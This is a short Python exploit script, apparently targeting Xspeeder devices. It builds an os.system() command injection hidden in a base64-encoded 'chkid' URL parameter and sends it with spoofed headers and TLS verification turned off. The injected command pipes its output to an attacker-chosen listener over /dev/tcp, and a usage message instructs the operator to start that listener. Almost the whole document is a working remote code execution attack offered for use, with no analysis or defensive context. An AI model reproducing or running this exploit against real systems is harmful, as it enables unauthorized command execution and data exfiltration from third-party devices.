import requests, sys, time
from base64 import b64encode
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class XspeederRCE:
    def __init__(self, target_url, listener_ip, listener_port, cmd):
        self.target_url = target_url
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.cmd = cmd
        self.session = requests.Session()

    def build_payload(self):
        payload = 'os.system("{}>/dev/tcp/{}/{}") #sUserCodexsPwd'.format(self.cmd, self.listener_ip, self.listener_port)
        self.target_url = "{}/?title=ABC&oIp=XXX&chkid={}".format(self.target_url, b64encode(payload.encode()).decode("utf-8"))

    def send_payload(self):
        headers = {
            'User-Agent': 'SXZ/2.3',
            'X-SXZ-R': str(int(time.time()/60) % 7)
        }
        self.session.get(self.target_url.rsplit('?')[0] + "/webInfos/", headers=headers, verify=False)
        self.session.get(self.target_url, headers=headers, verify=False)

    def run(self):
        self.build_payload()
        self.send_payload()

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("[-] Usage: {} <target_url> <listener_ip> <listener_port> <cmd>".format(sys.argv[0]))
        print("[-] Make sure to listen on listener_ip:listener_port")
        sys.exit(-1)
    XspeederRCE(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]).run() 
